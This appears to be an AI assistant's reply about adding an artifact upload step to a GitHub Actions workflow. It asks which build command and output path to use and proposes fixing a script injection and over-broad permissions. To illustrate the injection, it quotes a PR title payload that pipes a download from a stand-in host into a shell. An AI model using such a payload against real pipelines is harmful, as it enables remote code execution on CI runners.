I haven't edited the workflow yet. `.github/workflows/deploy.yml` has nothing for an upload step to follow, and the repo doesn't say what the build artifact is.

- **No tests or build in the workflow.** It only checks out the code and runs one `echo`. There's no step that tests or builds anything, so "after the tests pass" has nothing to attach to.
- **No clear build output.** The README says it's a Python package with tests (`tests/test_balance.py`), a Go file and a shell script. `.gitlab-ci.yml` runs `npm run build`, and the `Jenkinsfile` runs `make build`. Neither matches the code in the repo, and none of them names an output path.

Which of these do you want?

1. **Build command and output path.** For example, `python -m build` producing `dist/`, or `go build -o bin/parser ./cmd`. I'd add the test step, then the build step, then `actions/upload-artifact@v4` pointing at that path. Steps run in order and a failed step stops the job, so the upload only happens after the tests pass.
2. **Test step only.** I'd add `pytest` and an upload step for a path you give me.

I'd also like to fix two problems in the existing file while I'm there:

- **Script injection (line 14).** `${{ github.event.pull_request.title }}` is expanded straight into the shell command, so a PR title like `"; curl evil | sh #` runs as code. The fix is to pass it through `env:` and reference `"$PR_TITLE"`.
- **Over-broad permissions (line 7).** `permissions: write-all` gives the job write access to everything on a `pull_request` trigger. I'd change it to `contents: read`, which is all that checkout and artifact upload need.

Should I make those two fixes along with the new steps?
